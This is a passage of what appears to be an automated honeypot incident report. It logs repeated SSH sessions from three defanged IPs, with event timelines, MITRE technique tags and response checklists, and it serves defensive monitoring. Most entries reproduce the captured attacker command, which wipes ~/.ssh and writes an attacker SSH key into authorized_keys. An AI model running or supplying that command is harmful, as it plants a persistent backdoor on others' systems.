| `2026-04-14 04:32:44` | `cowrie.login.success` |
| `2026-04-14 04:32:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f43345cf5f4

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:34 |
| **Last Seen** | 2026-04-14 04:34 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:34:11` | `cowrie.session.connect` |
| `2026-04-14 04:34:11` | `cowrie.client.version` |
| `2026-04-14 04:34:11` | `cowrie.client.kex` |
| `2026-04-14 04:34:12` | `cowrie.login.success` |
| `2026-04-14 04:34:12` | `cowrie.session.params` |
| `2026-04-14 04:34:12` | `cowrie.command.input` |
| `2026-04-14 04:34:12` | `cowrie.command.failed` |
| `2026-04-14 04:34:13` | `cowrie.log.closed` |
| `2026-04-14 04:34:13` | `cowrie.session.params` |
| `2026-04-14 04:34:13` | `cowrie.command.input` |
| `2026-04-14 04:34:13` | `cowrie.session.file_download` |
| `2026-04-14 04:34:13` | `cowrie.log.closed` |
| `2026-04-14 04:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-92f2ea68376a

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:34 |
| **Last Seen** | 2026-04-14 04:34 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:34:15` | `cowrie.session.connect` |
| `2026-04-14 04:34:15` | `cowrie.client.version` |
| `2026-04-14 04:34:15` | `cowrie.client.kex` |
| `2026-04-14 04:34:16` | `cowrie.login.success` |
| `2026-04-14 04:34:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428cc1b21bba

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:38 |
| **Last Seen** | 2026-04-14 04:38 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:38:53` | `cowrie.session.connect` |
| `2026-04-14 04:38:53` | `cowrie.client.version` |
| `2026-04-14 04:38:54` | `cowrie.client.kex` |
| `2026-04-14 04:38:54` | `cowrie.login.success` |
| `2026-04-14 04:38:55` | `cowrie.session.params` |
| `2026-04-14 04:38:55` | `cowrie.command.input` |
| `2026-04-14 04:38:55` | `cowrie.command.failed` |
| `2026-04-14 04:38:55` | `cowrie.log.closed` |
| `2026-04-14 04:38:55` | `cowrie.session.params` |
| `2026-04-14 04:38:55` | `cowrie.command.input` |
| `2026-04-14 04:38:55` | `cowrie.session.file_download` |
| `2026-04-14 04:38:55` | `cowrie.log.closed` |
| `2026-04-14 04:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-428776b76b7e

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:38 |
| **Last Seen** | 2026-04-14 04:38 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:38:57` | `cowrie.session.connect` |
| `2026-04-14 04:38:57` | `cowrie.client.version` |
| `2026-04-14 04:38:58` | `cowrie.client.kex` |
| `2026-04-14 04:38:58` | `cowrie.login.success` |
| `2026-04-14 04:38:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b23b9825f3

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:40 |
| **Last Seen** | 2026-04-14 04:40 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:40:14` | `cowrie.session.connect` |
| `2026-04-14 04:40:14` | `cowrie.client.version` |
| `2026-04-14 04:40:14` | `cowrie.client.kex` |
| `2026-04-14 04:40:15` | `cowrie.login.success` |
| `2026-04-14 04:40:15` | `cowrie.session.params` |
| `2026-04-14 04:40:15` | `cowrie.command.input` |
| `2026-04-14 04:40:15` | `cowrie.command.failed` |
| `2026-04-14 04:40:16` | `cowrie.log.closed` |
| `2026-04-14 04:40:16` | `cowrie.session.params` |
| `2026-04-14 04:40:16` | `cowrie.command.input` |
| `2026-04-14 04:40:17` | `cowrie.session.file_download` |
| `2026-04-14 04:40:17` | `cowrie.log.closed` |
| `2026-04-14 04:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aff3f1a34e78

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:40 |
| **Last Seen** | 2026-04-14 04:40 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:40:20` | `cowrie.session.connect` |
| `2026-04-14 04:40:20` | `cowrie.client.version` |
| `2026-04-14 04:40:20` | `cowrie.client.kex` |
| `2026-04-14 04:40:21` | `cowrie.login.success` |
| `2026-04-14 04:40:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3ab32d5a7dd5

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:41 |
| **Last Seen** | 2026-04-14 04:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:41:35` | `cowrie.session.connect` |
| `2026-04-14 04:41:35` | `cowrie.client.version` |
| `2026-04-14 04:41:35` | `cowrie.client.kex` |
| `2026-04-14 04:41:36` | `cowrie.login.success` |
| `2026-04-14 04:41:37` | `cowrie.session.params` |
| `2026-04-14 04:41:37` | `cowrie.command.input` |
| `2026-04-14 04:41:37` | `cowrie.command.failed` |
| `2026-04-14 04:41:37` | `cowrie.log.closed` |
| `2026-04-14 04:41:38` | `cowrie.session.params` |
| `2026-04-14 04:41:38` | `cowrie.command.input` |
| `2026-04-14 04:41:38` | `cowrie.session.file_download` |
| `2026-04-14 04:41:38` | `cowrie.log.closed` |
| `2026-04-14 04:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a063fa4a3394

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:41 |
| **Last Seen** | 2026-04-14 04:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:41:41` | `cowrie.session.connect` |
| `2026-04-14 04:41:41` | `cowrie.client.version` |
| `2026-04-14 04:41:41` | `cowrie.client.kex` |
| `2026-04-14 04:41:42` | `cowrie.login.success` |
| `2026-04-14 04:41:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7fc85ad774b8

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:41 |
| **Last Seen** | 2026-04-14 04:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:41:49` | `cowrie.session.connect` |
| `2026-04-14 04:41:49` | `cowrie.client.version` |
| `2026-04-14 04:41:50` | `cowrie.client.kex` |
| `2026-04-14 04:41:50` | `cowrie.login.success` |
| `2026-04-14 04:41:51` | `cowrie.session.params` |
| `2026-04-14 04:41:51` | `cowrie.command.input` |
| `2026-04-14 04:41:51` | `cowrie.command.failed` |
| `2026-04-14 04:41:51` | `cowrie.log.closed` |
| `2026-04-14 04:41:51` | `cowrie.session.params` |
| `2026-04-14 04:41:51` | `cowrie.command.input` |
| `2026-04-14 04:41:51` | `cowrie.session.file_download` |
| `2026-04-14 04:41:51` | `cowrie.log.closed` |
| `2026-04-14 04:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8f48500b97b

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:41 |
| **Last Seen** | 2026-04-14 04:41 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:41:53` | `cowrie.session.connect` |
| `2026-04-14 04:41:53` | `cowrie.client.version` |
| `2026-04-14 04:41:53` | `cowrie.client.kex` |
| `2026-04-14 04:41:54` | `cowrie.login.success` |
| `2026-04-14 04:41:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `197.225.146[.]23` to AbuseIPDB if not already reported
- [ ] Block `197.225.146[.]23` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e0a5933745cd

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:41 |
| **Last Seen** | 2026-04-14 04:42 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:41:56` | `cowrie.session.connect` |
| `2026-04-14 04:41:56` | `cowrie.client.version` |
| `2026-04-14 04:41:56` | `cowrie.client.kex` |
| `2026-04-14 04:41:57` | `cowrie.login.success` |
| `2026-04-14 04:41:57` | `cowrie.session.params` |
| `2026-04-14 04:41:57` | `cowrie.command.input` |
| `2026-04-14 04:41:57` | `cowrie.command.failed` |
| `2026-04-14 04:41:58` | `cowrie.log.closed` |
| `2026-04-14 04:41:58` | `cowrie.session.params` |
| `2026-04-14 04:41:58` | `cowrie.command.input` |
| `2026-04-14 04:41:58` | `cowrie.session.file_download` |
| `2026-04-14 04:41:58` | `cowrie.log.closed` |
| `2026-04-14 04:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4ada193b1614

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:42 |
| **Last Seen** | 2026-04-14 04:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:42:00` | `cowrie.session.connect` |
| `2026-04-14 04:42:00` | `cowrie.client.version` |
| `2026-04-14 04:42:00` | `cowrie.client.kex` |
| `2026-04-14 04:42:01` | `cowrie.login.success` |
| `2026-04-14 04:42:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e3882a02d56e

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:43 |
| **Last Seen** | 2026-04-14 04:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:43:34` | `cowrie.session.connect` |
| `2026-04-14 04:43:34` | `cowrie.client.version` |
| `2026-04-14 04:43:34` | `cowrie.client.kex` |
| `2026-04-14 04:43:34` | `cowrie.login.success` |
| `2026-04-14 04:43:35` | `cowrie.session.params` |
| `2026-04-14 04:43:35` | `cowrie.command.input` |
| `2026-04-14 04:43:35` | `cowrie.command.failed` |
| `2026-04-14 04:43:35` | `cowrie.log.closed` |
| `2026-04-14 04:43:35` | `cowrie.session.params` |
| `2026-04-14 04:43:35` | `cowrie.command.input` |
| `2026-04-14 04:43:35` | `cowrie.session.file_download` |
| `2026-04-14 04:43:35` | `cowrie.log.closed` |
| `2026-04-14 04:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d09a86924979

| Field | Detail |
|---|---|
| **Source IP** | `213.6.203[.]226` |
| **First Seen** | 2026-04-14 04:43 |
| **Last Seen** | 2026-04-14 04:43 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:43:38` | `cowrie.session.connect` |
| `2026-04-14 04:43:38` | `cowrie.client.version` |
| `2026-04-14 04:43:38` | `cowrie.client.kex` |
| `2026-04-14 04:43:38` | `cowrie.login.success` |
| `2026-04-14 04:43:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.6.203[.]226` to AbuseIPDB if not already reported
- [ ] Block `213.6.203[.]226` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bcda70955fd7

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:44 |
| **Last Seen** | 2026-04-14 04:44 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:44:31` | `cowrie.session.connect` |
| `2026-04-14 04:44:31` | `cowrie.client.version` |
| `2026-04-14 04:44:31` | `cowrie.client.kex` |
| `2026-04-14 04:44:32` | `cowrie.login.success` |
| `2026-04-14 04:44:33` | `cowrie.session.params` |
| `2026-04-14 04:44:33` | `cowrie.command.input` |
| `2026-04-14 04:44:33` | `cowrie.command.failed` |
| `2026-04-14 04:44:33` | `cowrie.log.closed` |
| `2026-04-14 04:44:34` | `cowrie.session.params` |
| `2026-04-14 04:44:34` | `cowrie.command.input` |
| `2026-04-14 04:44:34` | `cowrie.session.file_download` |
| `2026-04-14 04:44:34` | `cowrie.log.closed` |
| `2026-04-14 04:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ab8f4b99e464

| Field | Detail |
|---|---|
| **Source IP** | `205.164.114[.]59` |
| **First Seen** | 2026-04-14 04:44 |
| **Last Seen** | 2026-04-14 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-14 04:44:37` | `cowrie.session.connect` |
| `2026-04-14 04:44:37` | `cowrie.client.version` |
| `2026-04-14 04:44:37` | `cowrie.client.kex` |
| `2026-04-14 04:44:38` | `cowrie.login.success` |
| `2026-04-14 04:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `205.164.114[.]59` to AbuseIPDB if not already reported
- [ ] Block `205.164.114[.]59` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-68f371ab5107

| Field | Detail |
|---|---|
| **Source IP** | `197.225.146[.]23` |
| **First Seen** | 2026-04-14 04:45 |
| **Last Seen** | 2026-04-14 04:45 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
